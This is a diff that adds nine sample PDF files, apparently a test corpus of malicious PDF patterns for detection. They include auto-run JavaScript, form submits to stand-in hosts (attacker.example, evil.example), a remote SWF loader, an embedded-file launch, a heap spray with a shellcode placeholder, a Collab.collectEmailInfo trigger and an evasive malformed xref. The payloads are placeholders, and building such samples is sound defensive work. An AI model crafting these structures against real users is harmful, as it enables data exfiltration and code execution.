@@ -68,3 +68,320 @@ trailer << /Root 5 0 R /Size 8 >>
 startxref
 600
 %%EOF
+
+## Example 4 – Catalog con /Names que contiene JavaScript
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 3 0 R >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 1 /Kids [4 0 R] >>
+endobj
+3 0 obj
+<< /S /JavaScript /JS (app.alert("JS desde Names tree malicioso");) >>
+endobj
+4 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
+endobj
+xref
+0 5
+0000000000 65535 f 
+0000000010 00000 n 
+0000000060 00000 n 
+0000000120 00000 n 
+0000000200 00000 n 
+trailer << /Root 1 0 R /Size 5 >>
+startxref
+260
+%%EOF
+
+## Example 5 – AcroForm con campo que hace SubmitForm a dominio malicioso
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /AcroForm 2 0 R /Pages 5 0 R >>
+endobj
+2 0 obj
+<< /Fields [3 0 R] >>
+endobj
+3 0 obj
+<< /FT /Btn
+   /T (Submit)
+   /Ff 65536
+   /MK << /CA (Send) >>
+   /AA << /D << /S /SubmitForm /F (http://attacker.example/collect.php) /Flags 4 >> >>
+>>
+endobj
+5 0 obj
+<< /Type /Pages /Count 1 /Kids [6 0 R] >>
+endobj
+6 0 obj
+<< /Type /Page /Parent 5 0 R /MediaBox [0 0 612 792] /Annots [3 0 R] >>
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000010 00000 n
+0000000075 00000 n
+0000000130 00000 n
+0000000300 00000 n
+0000000400 00000 n
+0000000500 00000 n
+trailer << /Root 1 0 R /Size 7 >>
+startxref
+600
+%%EOF
+
+## Example 6 – EmbeddedFile + exportDataObject + nLaunch=2
+%PDF-1.6
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles << /Names [(ok.doc) 3 0 R] >> >> /OpenAction 4 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 1 /Kids [5 0 R] >>
+endobj
+3 0 obj
+<< /Type /Filespec /F (ok.doc) /EF << /F 6 0 R >> >>
+endobj
+4 0 obj
+<< /S /JavaScript
+   /JS (this.exportDataObject({cName:"ok.doc", nLaunch:2});)
+>>
+endobj
+5 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
+endobj
+6 0 obj
+<< /Type /EmbeddedFile /Length 1024 >>
+stream
+...FAKE_DOC_CONTENT...
+endstream
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000010 00000 n 
+0000000085 00000 n 
+0000000150 00000 n 
+0000000250 00000 n 
+0000000400 00000 n 
+0000000500 00000 n 
+trailer << /Root 1 0 R /Size 7 >>
+startxref
+700
+%%EOF
+
+## Example 7 – OpenAction con JavaScript ofuscado + unescape + heap spray placeholder
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 1 /Kids [4 0 R] >>
+endobj
+3 0 obj
+<< /S /JavaScript
+   /JS (
+var spray = unescape("%u4141%u4141%u4141%u4141");
+var big = spray;
+while (big.length < 0x8000) big += spray;
+var arr = new Array();
+for (var i = 0; i < 200; i++) arr[i] = big + "SHELLCODE_PLACEHOLDER";
+app.alert("PDF opened");
+)
+>>
+endobj
+4 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
+endobj
+xref
+0 5
+0000000000 65535 f
+0000000010 00000 n
+0000000075 00000 n
+0000000200 00000 n
+0000000450 00000 n
+trailer << /Root 1 0 R /Size 5 >>
+startxref
+520
+%%EOF
+
+## Example 8 – Anotación con /AA (acciones adicionales) y JavaScript
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 1 /Kids [3 0 R] >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] >>
+endobj
+4 0 obj
+<< /Type /Annot
+   /Subtype /Text
+   /Rect [100 100 200 200]
+   /Contents (Hover for surprise)
+   /AA << /E << /S /JavaScript /JS (app.alert("Mouse enter triggers JS");) >>
+          /X << /S /JavaScript /JS (app.alert("Mouse exit triggers JS");) >> >>
+>>
+endobj
+xref
+0 5
+0000000000 65535 f
+0000000010 00000 n
+0000000060 00000 n
+0000000120 00000 n
+0000000300 00000 n
+trailer << /Root 1 0 R /Size 5 >>
+startxref
+360
+%%EOF
+
+## Example 9 – RichMedia annotation que carga contenido externo
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 1 /Kids [3 0 R] >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R
+   /MediaBox [0 0 612 792]
+   /Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<< /Type /Annot
+   /Subtype /RichMedia
+   /Rect [50 50 500 400]
+   /RichMediaContent << /Assets 5 0 R /Configurations 6 0 R >>
+>>
+endobj
+5 0 obj
+<< /Names [(movie) 7 0 R] >>
+endobj
+6 0 obj
+<< /RMConfig << /Instances [ << /Asset 7 0 R /Params << /Binding /Foreground >> >> ] >> >>
+endobj
+7 0 obj
+<< /Type /RichMediaInstance
+   /Subtype /Video
+   /Asset << /F (http://attacker.example/loader.swf) >>
+>>
+endobj
+xref
+0 8
+0000000000 65535 f
+0000000010 00000 n
+0000000060 00000 n
+0000000120 00000 n
+0000000220 00000 n
+0000000400 00000 n
+0000000500 00000 n
+0000000600 00000 n
+trailer << /Root 1 0 R /Size 8 >>
+startxref
+700
+%%EOF
+
+## Example 10 – XFA form con submit a servidor remoto
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog /AcroForm << /XFA 2 0 R >> /Pages 5 0 R >>
+endobj
+2 0 obj
+<< /Length 512 >>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <template xmlns="http://www.xfa.org/schema/xfa-template/2.8/">
+    <subform name="form1">
+      <field name="user">
+        <ui><textEdit/></ui>
+      </field>
+      <submit format="pdf" target="http://evil.example/xfa_receiver"/>
+    </subform>
+  </template>
+</xdp:xdp>
+endstream
+endobj
+5 0 obj
+<< /Type /Pages /Count 1 /Kids [6 0 R] >>
+endobj
+6 0 obj
+<< /Type /Page /Parent 5 0 R /MediaBox [0 0 612 792] >>
+endobj
+xref
+0 7
+0000000000 65535 f
+0000000010 00000 n
+0000000075 00000 n
+0000000600 00000 n
+0000000800 00000 n
+0000000900 00000 n
+0000001000 00000 n
+trailer << /Root 1 0 R /Size 7 >>
+startxref
+1100
+%%EOF
+
+## Example 11 – Objeto con stream ofuscado y JavaScript con collab.collectEmailInfo
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Count 1 /Kids [3 0 R] >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
+endobj
+4 0 obj
+<< /Length 256 /Filter /FlateDecode >>
+stream
+eJyrVkrLz1eyUkpOzy0oSi0qzs8r1S/LSy3BwA9OJS_PAYLOAD_COMPRESSED
+endstream
+endobj
+5 0 obj
+<< /S /JavaScript
+   /JS (
+var s = unescape("%u9090%u9090%u9090%u9090");
+Collab.collectEmailInfo();
+)
+>>
+endobj
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000060 00000 n
+0000000120 00000 n
+0000000200 00000 n
+0000000400 00000 n
+trailer << /Root 1 0 R /Size 6 >>
+startxref
+480
+%%EOF
+
+## Example 12 – Estructura PDF ligeramente corrupta para evadir análisis, aún con /JS presente
+%PDF-1.7
+1 0 obj
+<< /Type /Catalog /Pages 4 0 R /OpenAction 3 0 R >>
+endobj
+2 0 obj
+<< /Type /Page /Parent 4 0 R /MediaBox [0 0 612 792] >>
+endobj
+3 0 obj
+<< /S /JavaScript /JS (app.alert("Malformed xref but still runs");) >>
+endobj
+4 0 obj
+<< /Type /Pages /Count 1 /Kids [2 0 R] >>
+endobj
+xref
+0 2
+0000000000 65535 f
+0000000010 00000 n
+trailer << /Root 1 0 R /Size 5 >>
+startxref
+999999
+%%EOF
